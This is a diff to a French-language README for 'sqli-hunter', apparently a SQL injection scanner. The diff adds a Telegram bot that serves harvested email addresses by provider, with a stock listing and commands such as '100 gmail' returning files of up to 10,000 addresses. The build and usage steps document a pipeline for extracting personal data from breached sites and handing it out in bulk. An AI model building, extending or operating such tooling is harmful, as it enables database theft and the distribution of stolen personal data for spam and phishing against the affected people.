@@ -140,10 +140,39 @@ Une adresse par ligne, sans préfixe ni rapport JSON/SQL par site.
 ./sqli-hunter -u "https://x.com/p?id=1" -o results
 ```
 
+## Bot Telegram (export emails)
+
+Envoie les emails extraits en fichier `.txt` sur demande.
+
+```bash
+# 1. Créer un bot via @BotFather → récupérer le token
+export TELEGRAM_BOT_TOKEN="123456:ABC..."
+
+# 2. Lancer le bot (lit results/emails/)
+go build -o tg-bot ./cmd/tg-bot
+./tg-bot
+```
+
+Dans Telegram :
+
+```
+/list              → fournisseurs dispo + stock
+100 gmail          → fichier gmail.com_100.txt
+/get 50 bluewin    → 50 emails bluewin.ch
+```
+
+| Variable | Description |
+|----------|-------------|
+| `TELEGRAM_BOT_TOKEN` | Token BotFather (obligatoire) |
+| `RESULTS_DIR` | Dossier résultats [défaut: `results`] |
+| `TELEGRAM_ALLOWED_IDS` | IDs Telegram autorisés (ex: `123,456`) |
+| `TELEGRAM_MAX_EMAILS` | Max par requête [défaut: `10000`] |
+
 ## Installation
 
 ```bash
 go build -o sqli-hunter ./cmd/sqli-hunter
+go build -o tg-bot ./cmd/tg-bot
 ```
 
 ## Usage
